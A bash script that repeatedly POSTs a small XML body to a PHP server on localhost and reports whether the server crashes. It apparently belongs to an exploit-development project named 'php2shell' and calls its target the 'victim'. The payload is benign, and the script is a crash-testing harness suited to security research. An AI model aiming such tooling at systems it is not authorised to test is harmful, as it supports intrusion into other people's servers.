#!/bin/bash
# r1_drive.sh — fire N XML posts at the remote victim, report crash receipts.
set -u
PORT=${1:-18196}
N=${2:-5}
DIR=/mnt/c/Users/andre/Downloads/php2shell-claude
printf '<root><a>1</a><b>2</b><c>3</c></root>' > /tmp/r1.xml
for i in $(seq 1 "$N"); do
  R=$(curl -s --max-time 5 -X POST --data-binary @/tmp/r1.xml "http://127.0.0.1:$PORT/index.php" 2>&1)
  RC=$?
  A=$(bash $DIR/r1_serve.sh alive)
  echo "req$i curl=$RC resp=[$R] server=$A"
  if [ "$A" = DEAD ]; then echo "==== SERVER DIED at request $i ===="; break; fi
done
echo "--- server log"; tail -n 15 /tmp/php2shell_r/server.log
